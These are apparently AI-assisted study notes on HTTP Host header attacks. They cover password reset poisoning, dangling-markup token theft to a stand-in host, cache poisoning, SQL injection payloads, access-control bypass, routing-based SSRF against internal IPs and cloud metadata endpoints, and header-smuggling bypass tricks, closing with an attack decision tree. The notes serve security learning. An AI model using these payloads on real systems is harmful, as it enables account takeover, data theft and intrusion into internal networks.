# Complete HTTP Host Header Attack - Master Notes 📚

(Claude)

## 🌐 What is HTTP Host Header?

```
GET /page HTTP/1.1
Host: real-website.com    ← this thing!
```

It tells the server **which website you want** when multiple sites share one IP address. The problem — **attackers can change it to anything!**

---

## 🏗️ Why It's Vulnerable

```
Developer assumes:  "Host header is set by browser, must be safe!"
Reality:            Attacker intercepts with Burp and changes it freely!

Trust in Host header = every attack below becomes possible
```

---

## 🎯 All Attack Types — Complete Overview

---

### 1️⃣ Password Reset Poisoning

**What it is:** Trick the website into sending a password reset link pointing to attacker's server

**How it works:**
```
Normal reset link:
https://real-website.com/reset?token=abc123

Attacker changes Host header to evil-attacker.net
Poisoned reset link sent to victim:
https://evil-attacker.net/reset?token=abc123
                                        ↑
                               token delivered to attacker!
```

**Attack vector:** Host header → email link generation

**Requirements:**
- Website builds reset URL using Host header
- Victim's email address known to attacker

**Impact:** Full account takeover

---

### 2️⃣ Password Reset Poisoning via Dangling Markup

**What it is:** When you can't control the reset link, inject unclosed HTML tag to steal token from email body

**How it works:**
```
Inject into Host header:
real-website.com:'<a href="https://evil-attacker.net/?data=

Email becomes:
...reset token: abc123
...visit https://real-website.com:'<a href="https://evil-attacker.net/?data=
...                                                                          
     ↑ never closed! email client reads everything after as part of URL
     ↑ token gets sent to attacker's server automatically!
```

**Attack vector:** Host header → HTML email body → dangling open attribute

**Requirements:**
- Host header reflected somewhere in email body
- Email client renders HTML
- Sensitive content appears after injection point

**Impact:** Token stolen without victim clicking anything

---

```
The full list of override headers to try:

X-Forwarded-HostMost common
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

### 3️⃣ Web Cache Poisoning

**What it is:** Trick cache into storing poisoned response so ALL users get the evil version

**How it works:**
```
Step 1: Attacker sends request with evil Host header
        Host: evil-attacker.net
        → server reflects evil payload in response
        → cache SAVES this poisoned response

Step 2: Victim visits same URL normally
        Host: real-website.com
        → cache serves saved poisoned page!
        → victim gets attacker's payload!
```

**Attack vector:** Host header → reflected in page → cached → served to all users

**Requirements:**
- Host header reflected in response (script tags, links, etc)
- Application-level cache that doesn't include Host in cache key
- Cache must save the poisoned response

**Key concept:**
```
Standalone cache:    includes Host in cache key → harder to exploit
Application cache:   ignores Host in cache key  → easier to exploit
```

**Impact:** Stored XSS affecting every visitor until cache expires

---

### 4️⃣ SQL Injection via Host Header

**What it is:** Host header value inserted directly into SQL query without sanitization

**How it works:**
```
Backend code (vulnerable):
query = "SELECT * FROM sites WHERE domain = '" + Host + "'"

Normal:
Host: real-website.com
→ SELECT * FROM sites WHERE domain = 'real-website.com' ✅

Attack:
Host: real-website.com' OR '1'='1
→ SELECT * FROM sites WHERE domain = 'real-website.com' OR '1'='1'
→ returns ALL database rows! 😈
```

**Attack vector:** Host header → SQL query → database

**Payloads to try:**
```
real-website.com'                     → error based
real-website.com' OR '1'='1           → always true
real-website.com' AND SLEEP(5)--      → time based blind
real-website.com' UNION SELECT ...--  → data extraction
```

**Impact:** Read/modify/delete database, authentication bypass

---

### 5️⃣ Bypassing Access Control (Restricted Functionality)

**What it is:** Website checks Host header instead of proper authentication to allow/deny access

**How it works:**
```
Vulnerable code:
if Host == 'internal.website.com':
    show_admin_panel()
else:
    show_403()

Attack:
Just change Host to:
Host: internal.website.com
→ admin panel loads! 😈
```

**Attack vector:** Host header → access control check → bypass

**Common internal hostnames to try:**
```
admin.example.com
internal.example.com
intranet.example.com
dev.example.com
staging.example.com
localhost
127.0.0.1
```

**Impact:** Access to admin panels, internal tools, restricted features

---

### 6️⃣ Virtual Host Brute-Forcing

**What it is:** Guess hidden internal hostnames to discover private websites on the same server

**How it works:**
```
Public server hosts multiple sites:
www.example.com      → public ✅
intranet.example.com → hidden! no public DNS record

Attack:
Try different Host headers with wordlist:
Host: admin.example.com     → 404 ❌
Host: intranet.example.com  → 200 ✅ found it!
Host: staging.example.com   → 200 ✅ found it!
```

**Attack vector:** Host header → virtual host routing → hidden sites

**How to find hostnames without brute force:**
```
📄 JS files         → hardcoded internal URLs
🔒 SSL certificates → lists all domains (check crt.sh)
📧 Email headers    → internal server names
💬 Error messages   → leaked hostnames
🌐 DNS records      → some resolve to private IPs
```

**Tool:** Burp Intruder with subdomain wordlist

**Impact:** Access to dev/staging environments, internal tools, unpatched apps

---

### 7️⃣ Routing-Based SSRF

**What it is:** Trick load balancer into routing your request to internal servers using Host header

**How it works:**
```
Normal routing:
Host: real-website.com → load balancer → correct backend ✅

Attack:
Host: 192.168.0.1 → load balancer blindly follows → internal server! 😈

You can't reach internal servers directly
But load balancer CAN reach them
So you hijack the load balancer to do it for you!
```

**Attack vector:** Host header → load balancer routing → internal network

**Steps:**
```
1. Confirm with Burp Collaborator:
   Host: abc123.burpcollaborator.net
   → receive DNS lookup? = vulnerable!

2. Target internal IPs:
   Host: 192.168.0.1
   Host: 10.0.0.1
   Host: 172.16.0.1
   Host: 169.254.169.254  ← AWS metadata! 

3. Brute force IP ranges:
   192.168.0.0/16 = 192.168.0.0 → 192.168.255.255
   10.0.0.0/8     = 10.0.0.0    → 10.255.255.255
```

**Impact:** Access entire internal network, steal cloud credentials, reach databases

---

### 8️⃣ Connection State Attack

**What it is:** Server only validates Host header on first request of a connection, trusts all subsequent requests blindly

**How it works:**
```
Request 1 (innocent):
Host: real-website.com     ← server validates carefully ✅
Connection: keep-alive     ← keep connection open!

Request 2 (evil, SAME connection):
Host: 192.168.0.1          ← server skips validation! 😈
→ routes to internal server!

Server's wrong assumption:
"First request was legit = all requests on this connection are legit!"
```

**Attack vector:** Connection reuse → validation skip → Host header bypass

**How to execute in Burp:**
```
Use "Send group in sequence (single connection)"
Request 1: innocent Host
Request 2: evil Host
Both sent over same TCP connection!
```

**Can be combined with:**
```
→ Routing-based SSRF
→ Password reset poisoning  
→ Cache poisoning
```

**Impact:** Bypass Host validation entirely for all requests after first

---

### 9️⃣ SSRF via Malformed Request Line

**What it is:** Trick proxy into routing to wrong server by abusing @ symbol in URL path

**How it works:**
```
Proxy behaviour:
Takes path → prefixes with backend URL → forwards

Normal:
GET /page HTTP/1.1
Proxy builds: http://backend-server/page → correct ✅

Attack (@ trick):
GET @internal-server/page HTTP/1.1
Proxy builds: http://backend-server@internal-server/page
                                   ↑
URL reads as: go to internal-server
              username = backend-server
→ request goes to internal-server! 😈
```

**Attack vector:** Malformed request line → proxy URL building → wrong destination

**Payloads to try:**
```
GET @internal-server/admin HTTP/1.1
GET @192.168.0.1/admin HTTP/1.1
GET @169.254.169.254/latest/meta-data HTTP/1.1
GET //evil-server/path HTTP/1.1
GET %40internal-server/path HTTP/1.1   ← URL encoded @
```

**Impact:** Reach internal servers, steal cloud metadata credentials

---

## 🛠️ Attack Techniques to Bypass Protections

When basic Host header change gets blocked, try these:

### Duplicate Host Headers
```
Host: real-website.com     ← front-end reads this ✅
Host: evil-server.com      ← back-end reads this 😈
```

### Override Headers
```
Host: real-website.com           ← passes validation ✅
X-Forwarded-Host: evil-server.com ← backend trusts this 😈
X-Host: evil-server.com
X-Forwarded-Server: evil-server.com
X-HTTP-Host-Override: evil-server.com
Forwarded: host=evil-server.com
```

### Line Wrapping
```
GET /example HTTP/1.1
    Host: evil-server.com    ← indented! confuses parsers
Host: real-website.com
```

### Absolute URL
```
GET https://real-website.com/ HTTP/1.1
Host: evil-server.com        ← backend uses this!
```

### Port Injection
```
Host: real-website.com:evil-payload-here
```

### Subdomain Bypass
```
Host: evil.real-website.com      ← passes suffix check!
Host: real-website.com.evil.net  ← tricks loose matching!
```

---

## 🗺️ Master Attack Decision Tree

```
Can you modify Host header and still reach the site?
                │
        ┌───────┴───────┐
       YES              NO
        │               │
   Start attacking   Try bypass techniques:
        │            - Duplicate headers
        │            - Override headers
        │            - Line wrapping
        │            - Absolute URL
        │
        ├──→ Reflected in page?
        │         └──→ Cache exists? → Web Cache Poisoning
        │
        ├──→ Used in SQL query? → SQL Injection
        │
        ├──→ Used in access control? → Bypass Restrictions
        │
        ├──→ Used in password reset? → Reset Poisoning
        │         └──→ In email body? → Dangling Markup
        │
        ├──→ Load balancer routing? → Routing-Based SSRF
        │         └──→ Connection reuse? → Connection State Attack
        │
        ├──→ Proxy builds URLs? → Malformed Request Line SSRF
        │
        └──→ Unknown subdomains? → Virtual Host Brute-Force
```

